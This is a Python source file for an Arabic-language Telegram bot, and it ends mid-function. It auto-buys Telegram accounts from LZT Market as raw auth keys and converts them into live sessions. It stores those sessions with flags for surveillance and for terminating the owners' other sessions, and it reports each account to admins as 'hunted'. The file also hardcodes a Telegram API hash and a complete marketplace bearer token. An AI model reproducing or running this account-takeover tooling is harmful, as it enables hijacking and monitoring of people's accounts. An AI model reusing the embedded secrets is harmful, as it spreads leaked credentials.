import os
import re
import sys
import time
import sqlite3
import zipfile
import shutil
import asyncio
import base64
import struct
import traceback
import logging
import threading



logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", handlers=[logging.StreamHandler(sys.stdout)])

def radar_exception_handler(exctype, value, tb):
    logging.critical("\n" + "="*50)
    logging.critical("🚨 [رادار الأعطال] تم تجاوز الخطأ لضمان استقرار البوت!")
    logging.critical("".join(traceback.format_exception(exctype, value, tb)))
    logging.critical("="*50 + "\n")

sys.excepthook = radar_exception_handler

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

def run_async(coro):
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client
from pyrogram import filters
from pyrogram.handlers import MessageHandler
from pyrogram.enums import ChatType
from pyrogram.errors import (FloodWait, AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan, PasswordHashInvalid, BadRequest, SessionPasswordNeeded)
from pyrogram.raw import functions, types
from pyrogram.raw.functions.account import SendVerifyEmailCode, VerifyEmail
from pyrogram.raw.types import EmailVerifyPurposeLoginSetup
# (تم استخدام FloodWait وهي موجودة لديك مسبقاً في الملف)

from telethon.sessions import StringSession
from telethon.crypto import AuthKey
from pyrogram.raw.types import EmailVerifyPurposeLoginSetup, EmailVerificationCode, EmailVerifyPurposeLoginChange

try:
    from opentele.td import TDesktop
    OPENTELE_AVAILABLE = True
except ImportError:
    OPENTELE_AVAILABLE = False
except BaseException:
    OPENTELE_AVAILABLE = False

API_ID = 28797361
API_HASH = "771041b32e83ab232e066b7adeee700b" 

BOT_TOKEN = os.getenv("BOT_TOKEN")


ADMIN_IDS = [445421092, 6114298715, 8516187605, 936283959]
LOG_CHANNEL = "@I_HATE_YOO"

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=20)
USER_STATES = {}
PUBLIC_MODE = False

COUNTRIES_DB = [
  {"country": "United States", "arabic_name": "الولايات المتحدة", "flag": "🇺🇸", "code": "+1"},
  {"country": "Canada", "arabic_name": "كندا", "flag": "🇨🇦", "code": "+1"},
  {"country": "Russia", "arabic_name": "روسيا", "flag": "🇷🇺", "code": "+7"},
  {"country": "Kazakhstan", "arabic_name": "كازاخستان", "flag": "🇰🇿", "code": "+7"},
  {"country": "Egypt", "arabic_name": "مصر", "flag": "🇪🇬", "code": "+20"},
  {"country": "South Africa", "arabic_name": "جنوب أفريقيا", "flag": "🇿🇦", "code": "+27"},
  {"country": "Greece", "arabic_name": "اليونان", "flag": "🇬🇷", "code": "+30"},
  {"country": "Netherlands", "arabic_name": "هولندا", "flag": "🇳🇱", "code": "+31"},
  {"country": "Belgium", "arabic_name": "بلجيكا", "flag": "🇧🇪", "code": "+32"},
  {"country": "France", "arabic_name": "فرنسا", "flag": "🇫🇷", "code": "+33"},
  {"country": "Spain", "arabic_name": "إسبانيا", "flag": "🇪🇸", "code": "+34"},
  {"country": "Hungary", "arabic_name": "المجر", "flag": "🇭🇺", "code": "+36"},
  {"country": "Italy", "arabic_name": "إيطاليا", "flag": "🇮🇹", "code": "+39"},
  {"country": "Romania", "arabic_name": "رومانيا", "flag": "🇷🇴", "code": "+40"},
  {"country": "Switzerland", "arabic_name": "سويسرا", "flag": "🇨🇭", "code": "+41"},
  {"country": "Austria", "arabic_name": "النمسا", "flag": "🇦🇹", "code": "+43"},
  {"country": "United Kingdom", "arabic_name": "المملكة المتحدة", "flag": "🇬🇧", "code": "+44"},
  {"country": "Denmark", "arabic_name": "الدنمارك", "flag": "🇩🇰", "code": "+45"},
  {"country": "Sweden", "arabic_name": "السويد", "flag": "🇸🇪", "code": "+46"},
  {"country": "Norway", "arabic_name": "النرويج", "flag": "🇳🇴", "code": "+47"},
  {"country": "Poland", "arabic_name": "بولندا", "flag": "🇵🇱", "code": "+48"},
  {"country": "Germany", "arabic_name": "ألمانيا", "flag": "🇩🇪", "code": "+49"},
  {"country": "Peru", "arabic_name": "بيرو", "flag": "🇵🇪", "code": "+51"},
  {"country": "Mexico", "arabic_name": "المكسيك", "flag": "🇲🇽", "code": "+52"},
  {"country": "Cuba", "arabic_name": "كوبا", "flag": "🇨🇺", "code": "+53"},
  {"country": "Argentina", "arabic_name": "الأرجنتين", "flag": "🇦🇷", "code": "+54"},
  {"country": "Brazil", "arabic_name": "البرازيل", "flag": "🇧🇷", "code": "+55"},
  {"country": "Chile", "arabic_name": "تشيلي", "flag": "🇨🇱", "code": "+56"},
  {"country": "Colombia", "arabic_name": "كولومبيا", "flag": "🇨🇴", "code": "+57"},
  {"country": "Venezuela", "arabic_name": "فنزويلا", "flag": "🇻🇪", "code": "+58"},
  {"country": "Malaysia", "arabic_name": "ماليزيا", "flag": "🇲🇾", "code": "+60"},
  {"country": "Australia", "arabic_name": "أستراليا", "flag": "🇦🇺", "code": "+61"},
  {"country": "Indonesia", "arabic_name": "إندونيسيا", "flag": "🇮🇩", "code": "+62"},
  {"country": "Philippines", "arabic_name": "الفلبين", "flag": "🇵🇭", "code": "+63"},
  {"country": "New Zealand", "arabic_name": "نيوزيلندا", "flag": "🇳🇿", "code": "+64"},
  {"country": "Singapore", "arabic_name": "سنغافورة", "flag": "🇸🇬", "code": "+65"},
  {"country": "Thailand", "arabic_name": "تايلاند", "flag": "🇹🇭", "code": "+66"},
  {"country": "Japan", "arabic_name": "اليابان", "flag": "🇯🇵", "code": "+81"},
  {"country": "South Korea", "arabic_name": "كوريا الجنوبية", "flag": "🇰🇷", "code": "+82"},
  {"country": "Vietnam", "arabic_name": "فيتنام", "flag": "🇻🇳", "code": "+84"},
  {"country": "China", "arabic_name": "الصين", "flag": "🇨🇳", "code": "+86"},
  {"country": "Turkey", "arabic_name": "تركيا", "flag": "🇹🇷", "code": "+90"},
  {"country": "India", "arabic_name": "الهند", "flag": "🇮🇳", "code": "+91"},
  {"country": "Pakistan", "arabic_name": "باكستان", "flag": "🇵🇰", "code": "+92"},
  {"country": "Afghanistan", "arabic_name": "أفغانستان", "flag": "🇦🇫", "code": "+93"},
  {"country": "Sri Lanka", "arabic_name": "سريلانكا", "flag": "🇱🇰", "code": "+94"},
  {"country": "Myanmar", "arabic_name": "ميانمار", "flag": "🇲🇲", "code": "+95"},
  {"country": "Iran", "arabic_name": "إيران", "flag": "🇮🇷", "code": "+98"},
  {"country": "Morocco", "arabic_name": "المغرب", "flag": "🇲🇦", "code": "+212"},
  {"country": "Algeria", "arabic_name": "الجزائر", "flag": "🇩🇿", "code": "+213"},
  {"country": "Tunisia", "arabic_name": "تونس", "flag": "🇹🇳", "code": "+216"},
  {"country": "Libya", "arabic_name": "ليبيا", "flag": "🇱🇾", "code": "+218"},
  {"country": "Gambia", "arabic_name": "غامبيا", "flag": "🇬🇲", "code": "+220"},
  {"country": "Senegal", "arabic_name": "السنغال", "flag": "🇸🇳", "code": "+221"},
  {"country": "Mauritania", "arabic_name": "موريتانيا", "flag": "🇲🇷", "code": "+222"},
  {"country": "Mali", "arabic_name": "مالي", "flag": "🇲🇱", "code": "+223"},
  {"country": "Guinea", "arabic_name": "غينيا", "flag": "🇬🇳", "code": "+224"},
  {"country": "Ivory Coast", "arabic_name": "ساحل العاج", "flag": "🇨🇮", "code": "+225"},
  {"country": "Burkina Faso", "arabic_name": "بوركينا فاسو", "flag": "🇧🇫", "code": "+226"},
  {"country": "Niger", "arabic_name": "النيجر", "flag": "🇳🇪", "code": "+227"},
  {"country": "Togo", "arabic_name": "توجو", "flag": "🇹🇬", "code": "+228"},
  {"country": "Benin", "arabic_name": "بنين", "flag": "🇧🇯", "code": "+229"},
  {"country": "Mauritius", "arabic_name": "موريشيوس", "flag": "🇲🇺", "code": "+230"},
  {"country": "Liberia", "arabic_name": "ليبيريا", "flag": "🇱🇷", "code": "+231"},
  {"country": "Sierra Leone", "arabic_name": "سيراليون", "flag": "🇸🇱", "code": "+232"},
  {"country": "Ghana", "arabic_name": "غانا", "flag": "🇬🇭", "code": "+233"},
  {"country": "Nigeria", "arabic_name": "نيجيريا", "flag": "🇳🇬", "code": "+234"},
  {"country": "Chad", "arabic_name": "تشاد", "flag": "🇹🇩", "code": "+235"},
  {"country": "Central African Republic", "arabic_name": "جمهورية أفريقيا الوسطى", "flag": "🇨🇫", "code": "+236"},
  {"country": "Cameroon", "arabic_name": "الكاميرون", "flag": "🇨🇲", "code": "+237"},
  {"country": "Cape Verde", "arabic_name": "الرأس الأخضر", "flag": "🇨🇻", "code": "+238"},
  {"country": "Sao Tome and Principe", "arabic_name": "ساو تومي وبرينسيب", "flag": "🇸🇹", "code": "+239"},
  {"country": "Equatorial Guinea", "arabic_name": "غينيا الاستوائية", "flag": "🇬🇶", "code": "+240"},
  {"country": "Gabon", "arabic_name": "الجابون", "flag": "🇬🇦", "code": "+241"},
  {"country": "Republic of the Congo", "arabic_name": "جمهورية الكونغو", "flag": "🇨🇬", "code": "+242"},
  {"country": "Democratic Republic of the Congo", "arabic_name": "جمهورية الكونغو الديمقراطية", "flag": "🇨🇩", "code": "+243"},
  {"country": "Angola", "arabic_name": "أنغولا", "flag": "🇦🇴", "code": "+244"},
  {"country": "Guinea-Bissau", "arabic_name": "غينيا بيساو", "flag": "🇬🇼", "code": "+245"},
  {"country": "Seychelles", "arabic_name": "سيشل", "flag": "🇸🇨", "code": "+248"},
  {"country": "Sudan", "arabic_name": "السودان", "flag": "🇸🇩", "code": "+249"},
  {"country": "Rwanda", "arabic_name": "رواندا", "flag": "🇷🇼", "code": "+250"},
  {"country": "Ethiopia", "arabic_name": "إثيوبيا", "flag": "🇪🇹", "code": "+251"},
  {"country": "Somalia", "arabic_name": "الصومال", "flag": "🇸🇴", "code": "+252"},
  {"country": "Djibouti", "arabic_name": "جيبوتي", "flag": "🇩🇯", "code": "+253"},
  {"country": "Kenya", "arabic_name": "كينيا", "flag": "🇰🇪", "code": "+254"},
  {"country": "Tanzania", "arabic_name": "تنزانيا", "flag": "🇹🇿", "code": "+255"},
  {"country": "Uganda", "arabic_name": "أوغندا", "flag": "🇺🇬", "code": "+256"},
  {"country": "Burundi", "arabic_name": "بوروندي", "flag": "🇧🇮", "code": "+257"},
  {"country": "Mozambique", "arabic_name": "موزمبيق", "flag": "🇲🇿", "code": "+258"},
  {"country": "Zambia", "arabic_name": "زامبيا", "flag": "🇿🇲", "code": "+260"},
  {"country": "Madagascar", "arabic_name": "مدغشقر", "flag": "🇲🇬", "code": "+261"},
  {"country": "Zimbabwe", "arabic_name": "زيمبابوي", "flag": "🇿🇼", "code": "+263"},
  {"country": "Namibia", "arabic_name": "ناميبيا", "flag": "🇳🇦", "code": "+264"},
  {"country": "Malawi", "arabic_name": "مالاوي", "flag": "🇲🇼", "code": "+265"},
  {"country": "Lesotho", "arabic_name": "ليسوتو", "flag": "🇱🇸", "code": "+266"},
  {"country": "Botswana", "arabic_name": "بوتسوانا", "flag": "🇧🇼", "code": "+267"},
  {"country": "Eswatini", "arabic_name": "إسواتيني", "flag": "🇸🇿", "code": "+268"},
  {"country": "Comoros", "arabic_name": "جزر القمر", "flag": "🇰🇲", "code": "+269"},
  {"country": "Portugal", "arabic_name": "البرتغال", "flag": "🇵🇹", "code": "+351"},
  {"country": "Luxembourg", "arabic_name": "لوكسمبورغ", "flag": "🇱🇺", "code": "+352"},
  {"country": "Ireland", "arabic_name": "أيرلندا", "flag": "🇮🇪", "code": "+353"},
  {"country": "Iceland", "arabic_name": "آيسلندا", "flag": "🇮🇸", "code": "+354"},
  {"country": "Albania", "arabic_name": "ألبانيا", "flag": "🇦🇱", "code": "+355"},
  {"country": "Malta", "arabic_name": "مالطا", "flag": "🇲🇹", "code": "+356"},
  {"country": "Cyprus", "arabic_name": "قبرص", "flag": "🇨🇾", "code": "+357"},
  {"country": "Finland", "arabic_name": "فنلندا", "flag": "🇫🇮", "code": "+358"},
  {"country": "Bulgaria", "arabic_name": "بلغاريا", "flag": "🇧🇬", "code": "+359"},
  {"country": "Lithuania", "arabic_name": "ليتوانيا", "flag": "🇱🇹", "code": "+370"},
  {"country": "Latvia", "arabic_name": "لاتفيا", "flag": "🇱🇻", "code": "+371"},
  {"country": "Estonia", "arabic_name": "إستونيا", "flag": "🇪🇪", "code": "+372"},
  {"country": "Moldova", "arabic_name": "مولدوفا", "flag": "🇲🇩", "code": "+373"},
  {"country": "Armenia", "arabic_name": "أرمينيا", "flag": "🇦🇲", "code": "+374"},
  {"country": "Belarus", "arabic_name": "بيلاروسيا", "flag": "🇧🇾", "code": "+375"},
  {"country": "Andorra", "arabic_name": "أندورا", "flag": "🇦🇩", "code": "+376"},
  {"country": "Monaco", "arabic_name": "موناكو", "flag": "🇲🇨", "code": "+377"},
  {"country": "San Marino", "arabic_name": "سان مارينو", "flag": "🇸🇲", "code": "+378"},
  {"country": "Ukraine", "arabic_name": "أوكرانيا", "flag": "🇺🇦", "code": "+380"},
  {"country": "Serbia", "arabic_name": "صربيا", "flag": "🇷🇸", "code": "+381"},
  {"country": "Montenegro", "arabic_name": "الجبل الأسود", "flag": "🇲🇪", "code": "+382"},
  {"country": "Croatia", "arabic_name": "كرواتيا", "flag": "🇭🇷", "code": "+385"},
  {"country": "Slovenia", "arabic_name": "سلوفينيا", "flag": "🇸🇮", "code": "+386"},
  {"country": "Bosnia and Herzegovina", "arabic_name": "البوسنة والهرسك", "flag": "🇧🇦", "code": "+387"},
  {"country": "North Macedonia", "arabic_name": "مقدونيا الشمالية", "flag": "🇲🇰", "code": "+389"},
  {"country": "Czech Republic", "arabic_name": "جمهورية التشيك", "flag": "🇨🇿", "code": "+420"},
  {"country": "Slovakia", "arabic_name": "سلوفاكيا", "flag": "🇸🇰", "code": "+421"},
  {"country": "Liechtenstein", "arabic_name": "ليختنشتاين", "flag": "🇱🇮", "code": "+423"},
  {"country": "Belize", "arabic_name": "بليز", "flag": "🇧🇿", "code": "+501"},
  {"country": "Guatemala", "arabic_name": "غواتيمالا", "flag": "🇬🇹", "code": "+502"},
  {"country": "El Salvador", "arabic_name": "السلفادور", "flag": "🇸🇻", "code": "+503"},
  {"country": "Honduras", "arabic_name": "هندوراس", "flag": "🇭🇳", "code": "+504"},
  {"country": "Nicaragua", "arabic_name": "نيكاراغوا", "flag": "🇳🇮", "code": "+505"},
  {"country": "Costa Rica", "arabic_name": "كوستاريكا", "flag": "🇨🇷", "code": "+506"},
  {"country": "Panama", "arabic_name": "بنما", "flag": "🇵🇦", "code": "+507"},
  {"country": "Haiti", "arabic_name": "هايتي", "flag": "🇭🇹", "code": "+509"},
  {"country": "Bolivia", "arabic_name": "بوليفيا", "flag": "🇧🇴", "code": "+591"},
  {"country": "Guyana", "arabic_name": "غيانا", "flag": "🇬🇾", "code": "+592"},
  {"country": "Ecuador", "arabic_name": "الإكوادور", "flag": "🇪🇨", "code": "+593"},
  {"country": "Paraguay", "arabic_name": "باراغواي", "flag": "🇵🇾", "code": "+595"},
  {"country": "Suriname", "arabic_name": "سورينام", "flag": "🇸🇷", "code": "+597"},
  {"country": "Uruguay", "arabic_name": "أوروغواي", "flag": "🇺🇾", "code": "+598"},
  {"country": "Timor-Leste", "arabic_name": "تيمور الشرقية", "flag": "🇹🇱", "code": "+670"},
  {"country": "Brunei", "arabic_name": "بروناي", "flag": "🇧🇳", "code": "+673"},
  {"country": "Papua New Guinea", "arabic_name": "بابوا غينيا الجديدة", "flag": "🇵🇬", "code": "+675"},
  {"country": "Tonga", "arabic_name": "تونغا", "flag": "🇹🇴", "code": "+676"},
  {"country": "Fiji", "arabic_name": "فيجي", "flag": "🇫🇯", "code": "+679"},
  {"country": "North Korea", "arabic_name": "كوريا الشمالية", "flag": "🇰🇵", "code": "+850"},
  {"country": "Hong Kong", "arabic_name": "هونغ كونغ", "flag": "🇭🇰", "code": "+852"},
  {"country": "Macau", "arabic_name": "ماكاو", "flag": "🇲🇴", "code": "+853"},
  {"country": "Cambodia", "arabic_name": "كمبوديا", "flag": "🇰🇭", "code": "+855"},
  {"country": "Laos", "arabic_name": "لاوس", "flag": "🇱🇦", "code": "+856"},
  {"country": "Bangladesh", "arabic_name": "بنغلاديش", "flag": "🇧🇩", "code": "+880"},
  {"country": "Taiwan", "arabic_name": "تايوان", "flag": "🇹🇼", "code": "+886"},
  {"country": "Maldives", "arabic_name": "جزر المالديف", "flag": "🇲🇻", "code": "+960"},
  {"country": "Lebanon", "arabic_name": "لبنان", "flag": "🇱🇧", "code": "+961"},
  {"country": "Jordan", "arabic_name": "الأردن", "flag": "🇯🇴", "code": "+962"},
  {"country": "Syria", "arabic_name": "سوريا", "flag": "🇸🇾", "code": "+963"},
  {"country": "Iraq", "arabic_name": "العراق", "flag": "🇮🇶", "code": "+964"},
  {"country": "Kuwait", "arabic_name": "الكويت", "flag": "🇰🇼", "code": "+965"},
  {"country": "Saudi Arabia", "arabic_name": "السعودية", "flag": "🇸🇦", "code": "+966"},
  {"country": "Yemen", "arabic_name": "اليمن", "flag": "🇾🇪", "code": "+967"},
  {"country": "Oman", "arabic_name": "عمان", "flag": "🇴🇲", "code": "+968"},
  {"country": "Palestine", "arabic_name": "فلسطين", "flag": "🇵🇸", "code": "+970"},
  {"country": "United Arab Emirates", "arabic_name": "الإمارات", "flag": "🇦🇪", "code": "+971"},
  {"country": "Bahrain", "arabic_name": "البحرين", "flag": "🇧🇭", "code": "+973"},
  {"country": "Qatar", "arabic_name": "قطر", "flag": "🇶🇦", "code": "+974"},
  {"country": "Bhutan", "arabic_name": "بوتان", "flag": "🇧🇹", "code": "+975"},
  {"country": "Mongolia", "arabic_name": "منغوليا", "flag": "🇲🇳", "code": "+976"},
  {"country": "Nepal", "arabic_name": "نيبال", "flag": "🇳🇵", "code": "+977"},
  {"country": "Tajikistan", "arabic_name": "طاجيكستان", "flag": "🇹🇯", "code": "+992"},
  {"country": "Turkmenistan", "arabic_name": "تركمانستان", "flag": "🇹🇲", "code": "+993"},
  {"country": "Azerbaijan", "arabic_name": "أذربيجان", "flag": "🇦🇿", "code": "+994"},
  {"country": "Georgia", "arabic_name": "جورجيا", "flag": "🇬🇪", "code": "+995"},
  {"country": "Kyrgyzstan", "arabic_name": "قرغيزستان", "flag": "🇰🇬", "code": "+996"},
  {"country": "Uzbekistan", "arabic_name": "أوزبكستان", "flag": "🇺🇿", "code": "+998"}
]

def get_country_info(phone):
    if not phone or phone == "Unknown":
        return "غير معروف", "🌍"

    phone_str = str(phone)
    if not phone_str.startswith('+'):
        phone_str = '+' + phone_str

    sorted_db = sorted(COUNTRIES_DB, key=lambda x: len(x['code']), reverse=True)

    for country in sorted_db:
        if phone_str.startswith(country['code']):
            return country['arabic_name'], country['flag']

    return "غير معروف", "🌍"

# =========================================================
# 🗄️ إدارة قواعد البيانات
# =========================================================

def get_db_conn():
    return sqlite3.connect('accounts_pro_v2.db', check_same_thread=False, timeout=20)

def init_db():
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("PRAGMA journal_mode=WAL;")
    c.execute(''' CREATE TABLE IF NOT EXISTS sessions ( id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT, auto_term_enabled INTEGER DEFAULT 0, auto_term_interval INTEGER DEFAULT 24, last_term_attempt INTEGER DEFAULT 0 ) ''')
    try:
        c.execute("ALTER TABLE sessions ADD COLUMN surveilled INTEGER DEFAULT 0")
    except:
        pass
    try:
        c.execute("ALTER TABLE sessions ADD COLUMN hex_key TEXT")
        c.execute("ALTER TABLE sessions ADD COLUMN dc_id INTEGER")
    except:
        pass
    c.execute(''' CREATE TABLE IF NOT EXISTS allowed_users ( user_id INTEGER PRIMARY KEY, first_name TEXT ) ''')
    conn.commit()
    conn.close()

def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(""" INSERT INTO sessions ( owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type ) VALUES (?, ?, ?, ?, ?, ?, ?) """, (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type))
    conn.commit()
    conn.close()

def save_hex_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, hex_key, dc_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(""" INSERT INTO sessions ( owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, hex_key, dc_id ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) """, (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, hex_key, dc_id))
    acc_id = c.lastrowid
    conn.commit()
    conn.close()
    return acc_id

def get_all_accounts(owner_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name, user_id, pyro_session FROM sessions WHERE owner_id=?", (owner_id,))
    rows = c.fetchall()
    conn.close()
    return rows

def get_account(acc_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id, owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, auto_term_enabled, auto_term_interval, last_term_attempt, surveilled FROM sessions WHERE id=?", (acc_id,))
    row = c.fetchone()
    conn.close()
    return row

def delete_account(acc_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
    conn.commit()
    conn.close()

def check_duplicate(owner_id, user_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id FROM sessions WHERE owner_id=? AND user_id=?", (owner_id, user_id))
    exists = c.fetchone()
    conn.close()
    return bool(exists)

def add_allowed_user(user_id, first_name):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO allowed_users (user_id, first_name) VALUES (?, ?)", (user_id, first_name))
    conn.commit()
    conn.close()

def remove_allowed_user(user_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("DELETE FROM allowed_users WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def is_allowed(user_id):
    if user_id in ADMIN_IDS: return True
    if PUBLIC_MODE: return True  # <== هذا السطر هو الذي يفتح البوت للجميع
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT 1 FROM allowed_users WHERE user_id=?", (user_id,))
    exists = c.fetchone()
    conn.close()
    return bool(exists)
def get_all_allowed_users():
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT user_id, first_name FROM allowed_users")
    rows = c.fetchall()
    conn.close()
    return rows

init_db()


import aiohttp
import asyncio
import time
import json
import traceback
import re
import threading
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client

# ==========================================
# ⚙️ إعدادات LZT Market و مدير المهام
# ==========================================
LZT_API_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJzdWIiOjEwNjEwNDg5LCJpc3MiOiJsenQiLCJpYXQiOjE3ODE4NTEyMDAsImp0aSI6Ijk4NzQ3MyIsInNjb3BlIjoiYmFzaWMgcmVhZCBwb3N0IGNvbnZlcnNhdGUgcGF5bWVudCBpbnZvaWNlIGNoYXRib3ggbWFya2V0IiwiZXhwIjoxOTM5NTMxMjAwfQ.eJWZBTsGxn6rCQaflQYC4jcdtRYKUawXmJ75Fm54IwupUPVWOyTtaEFBLqItYvecVycPtO6TyaM_wEFDYQOrdKPWxvXJipohQOKtrpKex2iKdizNYQs1KImn5D4daQW_bJyt_W5-wAz--P9i3GDP9_w44FmRTr62E7ju5nCIeJU"
LZT_HEADERS = {"Authorization": f"Bearer {LZT_API_TOKEN}", "Accept": "application/json"}

ACTIVE_SNIPERS = {} 
PROCESSING_IDS = set() 

if 'USER_STATES' not in globals():
    USER_STATES = {}

# ==========================================
# 📡 دوال الاتصال الأساسية
# ==========================================
async def lzt_get_usd_balance():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.lzt.market/me", headers=LZT_HEADERS, timeout=15) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    rub_balance = float(data.get("user", {}).get("balance", 0))

                    usd_rate = 92.0 
                    try:
                        async with session.get("https://api.lzt.market/currency", headers=LZT_HEADERS, timeout=10) as c_resp:
                            if c_resp.status == 200:
                                c_data = await c_resp.json()
                                usd_rate = float(c_data.get("usd", 92.0))
                    except:
                        pass

                    usd_balance = rub_balance / usd_rate
                    return round(usd_balance, 2), rub_balance
                else:
                    return -1.0, -1.0
    except:
        return 0.0, 0.0

async def process_lzt_purchase(admin_id, result, price, task_name="شراء يدوي"):
    try:
        login_data = result['loginData']
        hex_key = login_data.get('login', '')
        dc_id = int(login_data.get('password', '2'))

        pyro_sess, tl_sess = generate_sessions(API_ID, dc_id, bytes.fromhex(hex_key))

        client = Client(f"lz_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_sess, in_memory=True)
        await client.connect()
        me = await client.get_me()
        await client.disconnect()

        phone = f"+{me.phone_number}" if me.phone_number else "Unknown"
        name = me.first_name or "User"

        save_hex_account(admin_id, phone, me.id, name, pyro_sess, tl_sess, "LZT", hex_key, dc_id)

        msg_text = (
            f"🎣┊ **تـم صـيـد حـسـاب جـديـد بـنـجـاح!**\n\n"
            f"⎉╎ الاسـم: {name}\n"
            f"⎉╎ الآيـدي: `{me.id}`\n"
            f"⎉╎ الـدولـة/الرقم: {phone}\n"
            f"⎉╎ الـمـصـدر: `{task_name}`\n"
            f"•❐• سـنـة الإنـشـاء: {get_creation_year(me.id)}\n"
            f"•❐• الـسـعـر: {price}\n\n"
            f"✅┊ تـم تـسـجـيـل الـجـلـسـة فـي قـاعـدة الـبـيـانـات بـنـجـاح."
        )
        bot.send_message(admin_id, msg_text, parse_mode="Markdown")
        return True
    except Exception as e:
        bot.send_message(admin_id, f"⚠️┊ تـم الـشـراء بـنـجـاح ولـكـن فـشـل تـسـجـيـلـه بـالـبـوت:\n`{e}`", parse_mode="Markdown")
        return False

# ==========================================
# 🚀 محرك القنص الشرس (المدمج بالانتظار والفحص)
# ==========================================
async def lzt_fast_buy_concurrent(session, item_id, price):
    url = f"https://api.lzt.market/{item_id}/fast-buy"
    payload = {"price": price}
    try:
        # التايم أوت 25 ثانية لأن الموقع سيقوم بفحص الحساب قبل الرد
        async with session.post(url, headers=LZT_HEADERS, data=payload, timeout=25) as resp:
            data = await resp.json()
            if "item" in data and "loginData" in data["item"]:
                return True, data["item"], price
    except:
        pass
    return False, None, price

async def delayed_purchase_logic(session, item_id, price, admin_id, task_name, delay_seconds, task_id):
    try:
        bot.send_message(admin_id, 
            f"⚠️┊ **تـم صـيـد حـسـاب مـطـابـق!**\n\n"
            f"⎉╎ الـسـعـر الـفـعـلي: `{price}`\n"
            f"⎉╎ كـود الـمـنـتـج: `{item_id}`\n\n"
            f"•❐• جـاري الانـتـظـار **{delay_seconds} ثـوانـي** فـي الـذاكـرة قـبـل إرسـال الـطـلـب... ⏳", parse_mode="Markdown")

        await asyncio.sleep(delay_seconds)

        # بعد الانتظار، نرسل طلب الشراء ليقوم الموقع بالفحص
        success, item_data, final_price = await lzt_fast_buy_concurrent(session, item_id, price)

        if success:
            if task_id in ACTIVE_SNIPERS:
                ACTIVE_SNIPERS[task_id]["bought_count"] = ACTIVE_SNIPERS[task_id].get("bought_count", 0) + 1
            await process_lzt_purchase(admin_id, item_data, final_price, task_name)
        else:
            bot.send_message(admin_id, 
                f"❌┊ **تـم الانـتـظـار والـفـحـص ولـكـن ودع الـحـسـاب!**\n"
                f"•❐• اسـتـعـدت `{price}` ✨", parse_mode="Markdown")
    except Exception:
        pass
    finally:
        if item_id in PROCESSING_IDS:
            PROCESSING_IDS.remove(item_id)

async def sniper_worker(task_id, admin_id, task_name, filters, target_count, required_hours=0):
    ACTIVE_SNIPERS[task_id]["bought_count"] = 0
    bot.send_message(admin_id, f"🚀┊ **تـم تـشـغـيـل الـقـنـاص الـشـرس:** `{task_name}`\n•❐• الـهـدف: {target_count} حـسـاب | يـعـمـل بـنـظـام الـهـجـوم الـمـتـوازي ⚡️.")

    # بناء الفلاتر بطريقة متوافقة مع إرسال عدة دول للموقع
    currency_val = filters.get("currency", "usd")
    clean_filters = [("currency", currency_val)]
    for key, value in filters.items():
        if key == "currency": continue
        if isinstance(value, list):
            for v in value:
                clean_filters.append((key, v))
        else:
            if str(value).lower() not in ["nomatter", "الكل", "any", "", "none"]:
                clean_filters.append((key, value))

    connector = aiohttp.TCPConnector(limit=50) 
    async with aiohttp.ClientSession(connector=connector) as session:
        while ACTIVE_SNIPERS.get(task_id) and ACTIVE_SNIPERS[task_id].get("bought_count", 0) < target_count:
            try:
                items = []
                async with session.get("https://api.lzt.market/telegram", headers=LZT_HEADERS, params=clean_filters, timeout=15) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        items = data.get("items", [])
                    elif resp.status == 429:
                        await asyncio.sleep(4) 
                        continue

                valid_items = []
                for item in items:
                    if item['item_id'] in PROCESSING_IDS: 
                        continue

                    published_date = item.get('published_date') or item.get('date', time.time())
                    age_hours = (time.time() - published_date) / 3600
                    if required_hours > 0 and age_hours < required_hours: continue
                    valid_items.append(item)

                if valid_items:
                    needed = target_count - ACTIVE_SNIPERS[task_id].get("bought_count", 0)
                    targets_to_buy = valid_items[:needed]

                    if targets_to_buy:
                        delay_seconds = 0
                        if "10 ثواني" in task_name: delay_seconds = 10

                        if delay_seconds > 0:
                            for item in targets_to_buy:
                                PROCESSING_IDS.add(item['item_id'])
                                asyncio.create_task(delayed_purchase_logic(
                                    session, item['item_id'], float(item['price']), admin_id, task_name, delay_seconds, task_id
                                ))
                            await asyncio.sleep(2)
                        else:
                            # شراء فوري مع فحص الموقع
